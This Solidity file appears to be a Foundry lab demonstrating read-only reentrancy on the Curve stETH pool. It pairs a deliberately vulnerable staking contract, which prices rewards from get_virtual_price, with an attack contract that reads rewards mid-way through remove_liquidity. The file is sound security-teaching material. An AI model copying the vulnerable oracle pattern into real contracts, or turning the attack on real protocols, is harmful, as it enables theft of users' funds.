// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {console} from "forge-std/console.sol";

address constant STETH_POOL = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
address constant LP_TOKEN_STETH_POOL = 0x06325440D014e39736583c165C2963BA99fAf14E;

interface ICurve {
    function get_virtual_price() external view returns (uint256);

    function add_liquidity(
        uint256[2] calldata,
        uint256
    ) external payable returns (uint256);

    function remove_liquidity(
        uint256,
        uint256[2] calldata
    ) external returns (uint256);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address) external view returns (uint256);

    function transfer(address, uint256) external returns (bool);

    function allowance(address, address) external view returns (uint256);

    function approve(address, uint256) external returns (bool);

    function transferFrom(address, address, uint256) external returns (bool);
}

contract ROAttack {
    ICurve pool = ICurve(STETH_POOL);
    IERC20 token = IERC20(LP_TOKEN_STETH_POOL);

    ROTarget roTarget;

    constructor(address _roTarget) {
        roTarget = ROTarget(_roTarget);
    }

    receive() external payable {
        // Log the virtual price
        console.log(
            "VIRTUAL PRICE (DURING REMOVE LP): ",
            pool.get_virtual_price()
        );

        uint256 reward = roTarget.getReward();
        console.log("REWARD: ", reward);
    }

    function setUp() external payable {
        uint256[2] memory amounts = [msg.value, 0];
        uint256 lp = pool.add_liquidity{value: msg.value}(amounts, 1);

        token.approve(address(roTarget), lp);
        roTarget.stake(lp);


    }

    function attack() external payable {
        // Add liquidity to the pool
        uint256[2] memory amounts = [msg.value, 0];
        uint256 lp = pool.add_liquidity{value: msg.value}(amounts, 1);

        // Log the virtual price
        console.log(
            "VIRTUAL PRICE (BEFORE REMOVE LP): ",
            pool.get_virtual_price()
        );

        // Remove liquidity from the pool
        uint256[2] memory minAmounts = [uint256(0), uint256(0)];
        pool.remove_liquidity(lp, minAmounts);

        uint256 reward = roTarget.getReward();
        console.log("REWARD: ", reward);
    }
}

contract ROTarget {
    ICurve pool = ICurve(STETH_POOL);
    IERC20 token = IERC20(LP_TOKEN_STETH_POOL);

    mapping(address account => uint256 balance) balanceOf;

    function stake(uint256 _amount) external {
        token.transferFrom(msg.sender, address(this), _amount);
        balanceOf[msg.sender] += _amount;
    }

    function unstake(uint256 _amount) external {
        balanceOf[msg.sender] -= _amount;
        token.transfer(msg.sender, _amount);
    }

    function getReward() external view returns (uint256){
        uint256 reward = balanceOf[msg.sender] * pool.get_virtual_price() / 1e18;
        // Skip - Code to transfer reward to msg.sender
        return reward;
    }
}
